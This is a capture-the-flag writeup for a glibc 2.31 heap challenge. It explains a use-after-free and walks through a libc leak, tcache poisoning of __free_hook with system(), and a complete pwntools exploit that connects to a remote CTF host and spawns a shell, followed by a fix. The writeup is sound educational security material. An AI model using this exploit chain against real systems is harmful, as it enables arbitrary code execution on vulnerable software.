# The Corroded Crown: pwn writeup

**Category:** pwn (heap exploitation)
**Protections:** PIE, Full RELRO, stack canary, NX
**libc:** 2.31 (Ubuntu, bundled), tcache present, no safe-linking

## Challenge

We're given a stripped-of-mystery-but-not-stripped-of-symbols binary, `corroded_crown`, along with its own `libc.so.6` and `ld-linux-x86-64.so.2`. It's a menu-driven heap challenge:

```
1. Forge
2. Inscribe
3. Inspect
4. Destroy
```

Backing storage is a fixed array of 64 slots:

```c
struct relic {
    void    *ptr;
    uint32_t size;
    uint8_t  in_use;
} relic[64];
```

- **Forge**: `malloc(size)`, stores `ptr`/`size`, sets `in_use = 1`. Checks the slot isn't already in use.
- **Inscribe**: reads `relic[idx].size` bytes from stdin into `relic[idx].ptr`.
- **Inspect**: writes `relic[idx].size` bytes from `relic[idx].ptr` to stdout.
- **Destroy**: `free(relic[idx].ptr)`, sets `in_use = 0`. Checks the slot is in use first.

## The bug

`Destroy` frees the chunk and clears the `in_use` flag, but **never zeroes `ptr` or `size`**. Worse, `Inscribe` and `Inspect` **never check `in_use` at all**: they'll happily read from or write to whatever `ptr`/`size` is sitting in a slot, freed or not.

That's a textbook **use-after-free**: once a chunk is freed, its slot still holds a live pointer and size, and we can read or write through it at will, with no re-forging or flag manipulation required.

## Exploit plan

With glibc 2.31 (tcache, double-free key-check present, but no safe-linking: that lands in 2.32), the UAF gives us arbitrary read and arbitrary write on freed heap memory, which is enough for a full hook-overwrite chain.

### Stage 1: libc leak via the unsorted bin

```
forge(0, 0x500)   # large chunk, doesn't fit tcache
forge(1, 0x20)    # guard chunk, stops chunk 0 merging into top on free
destroy(0)        # chunk 0 -> unsorted bin; fd/bk now point into main_arena
inspect(0)        # UAF read: slot 0's stale ptr still points at that freed chunk
```

The leaked `fd`/`bk` is a pointer into `main_arena`. Empirically (verified against `/proc/pid/maps` across multiple runs) this leak sits at a **fixed offset of `0x1ecbe0`** from the libc base for this exact allocation pattern:

```
libc_base = leak - 0x1ecbe0
```

### Stage 2: tcache poisoning

```
forge(2, 0x80)
forge(3, 0x80)
destroy(2)        # tcache[0x90]: 2 -> NULL
destroy(3)        # tcache[0x90]: 3 -> 2 -> NULL
inscribe(3, p64(free_hook))   # UAF write: overwrite freed chunk 3's fd
```

Slot 3 still points at chunk 3's freed memory. Since chunk 3 sits at the head of the tcache free-list, overwriting the first 8 bytes there overwrites its `fd` pointer: the classic tcache-poisoning primitive. The free-list now reads: `3 -> __free_hook`.

### Stage 3: land an allocation on `__free_hook`

```
forge(4, 0x80)     # pops the real chunk 2 off the list
forge(5, 0x80)     # pops the fake "chunk" at __free_hook
inscribe(5, p64(system_addr))   # write system()'s address directly onto the hook
```

`malloc` doesn't validate that the popped tcache entry is really a valid chunk, so the second `forge` returns a pointer straight into libc's `__free_hook`. Writing 8 bytes there installs `system`.

### Stage 4: trigger

```
forge(6, 0x30)
inscribe(6, b"/bin/sh\x00")
destroy(6)         # free(ptr) -> __free_hook fires -> system("/bin/sh")
```

Because `__free_hook` is checked by glibc's `free()` before the normal free path runs, `destroy(6)` becomes `system("/bin/sh")`: dropping into a shell inside the process.

## Diagram

```
 destroy() frees but never clears the slot
              |
              v
 1. UAF read leaks libc  (free big chunk, inspect stale slot -> unsorted bin ptr)
              |
              v
 2. UAF write poisons tcache  (free two equal chunks, inscribe stale slot -> __free_hook)
              |
              v
 3. Two forges pop the poisoned list  (2nd allocation *is* __free_hook)
              |
              v
 4. Write system() into __free_hook
              |
              v
 5. free("/bin/sh")  ==  system("/bin/sh")
              |
              v
          root shell
```

## Local validation

Before touching the remote target, the full chain was validated against the bundled binary + bundled libc 2.31 locally (no pwntools available in the analysis sandbox, so a raw-socket/pipe harness was used first):

```
libc leak: 0x7f16a31e1be0
libc base: 0x7f16a2ff5000
free_hook: 0x7f16a31e3e48  system: 0x7f16a3047290
...
FINAL OUTPUT: b'uid=0(root) gid=0(root) groups=0(root)\nDONE_MARKER\n'
```

Confirms the offset `0x1ecbe0` and the full chain reliably pop a shell.

## Final exploit (pwntools)

```python
#!/usr/bin/env python3
from pwn import *
import argparse

HOST = "154.57.164.82"
PORT = 30229

BINARY = "./corroded_crown"
LIBC   = "./glibc/libc.so.6"
LD     = "./glibc/ld-linux-x86-64.so.2"

FREE_HOOK_OFF     = 0x1eee48
SYSTEM_OFF        = 0x052290
UNSORTED_LEAK_OFF = 0x1ecbe0   # empirically verified, stable across ASLR

context.binary = BINARY
elf  = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False)

parser = argparse.ArgumentParser()
parser.add_argument("--local", dest="LOCAL", action="store_true")
parser.add_argument("--gdb", dest="GDB", action="store_true")
args, _ = parser.parse_known_args()

def start():
    if args.LOCAL:
        return process([LD, "--library-path", "./glibc", BINARY])
    return remote(HOST, PORT)

def forge(io, idx, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"): ", str(idx).encode())
    io.sendlineafter(b"): ", str(size).encode())

def inscribe(io, idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"): ", str(idx).encode())
    io.sendafter(b"bytes):\n", data)

def inspect(io, idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"): ", str(idx).encode())
    io.recvuntil(b"]: ")
    return io.recvuntil(b"\n\n1. Forge", drop=True)

def destroy(io, idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"): ", str(idx).encode())

def main():
    io = start()

    # stage 1: libc leak
    forge(io, 0, 0x500)
    forge(io, 1, 0x20)
    destroy(io, 0)
    leak = inspect(io, 0)
    libc.address = u64(leak[:8].ljust(8, b"\x00")) - UNSORTED_LEAK_OFF
    log.success(f"libc base: {hex(libc.address)}")

    free_hook   = libc.address + FREE_HOOK_OFF
    system_addr = libc.address + SYSTEM_OFF

    # stage 2: tcache poison
    forge(io, 2, 0x80)
    forge(io, 3, 0x80)
    destroy(io, 2)
    destroy(io, 3)
    inscribe(io, 3, p64(free_hook))

    # stage 3: pop twice, land on __free_hook
    forge(io, 4, 0x80)
    forge(io, 5, 0x80)
    inscribe(io, 5, p64(system_addr))

    # stage 4: trigger
    forge(io, 6, 0x30)
    inscribe(io, 6, b"/bin/sh\x00")
    destroy(io, 6)

    log.success('Triggered system("/bin/sh") via __free_hook')
    io.interactive()

if __name__ == "__main__":
    main()
```

Run it with:

```bash
pip install pwntools
python3 solve.py
```

Then, in the interactive shell it drops into:

```
cat flag*
```

to retrieve `HTB{...}`.

## Root cause and fix

The vulnerability boils down to a single missing check plus a missing sanitization step:

1. `destroy_relic()` should zero out `relic[idx].ptr` and `relic[idx].size` after freeing, not just clear `in_use`.
2. `inscribe_relic()` and `inspect_relic()` should reject any operation on a slot where `in_use == 0`.

Either fix alone closes the UAF; both together is defense in depth.
